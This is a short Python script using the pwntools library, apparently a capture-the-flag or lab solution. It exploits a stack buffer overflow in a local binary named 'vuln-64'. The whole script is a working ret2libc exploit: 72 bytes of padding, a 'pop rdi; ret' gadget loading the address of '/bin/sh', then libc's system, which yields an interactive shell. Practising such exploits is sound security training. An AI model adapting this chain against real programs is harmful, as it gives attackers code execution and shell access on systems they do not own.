from pwn import *

context.binary = ELF("./vuln-64")

offset = 72
# system_offset = 0x0000000000050d70
# binsh_offset = 0x1d8678
main_ret = 0x000000000040116e 


# 0x00000000004011cb : pop rdi ; ret
pop_rdi = 0x00000000004011cb

p = process()
libc = p.libc
payload = flat([
    b"A" * offset,
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    main_ret,
    libc.sym["system"]
])

# gdb.attach(p)
p.recvline()
p.sendline(payload)
p.interactive()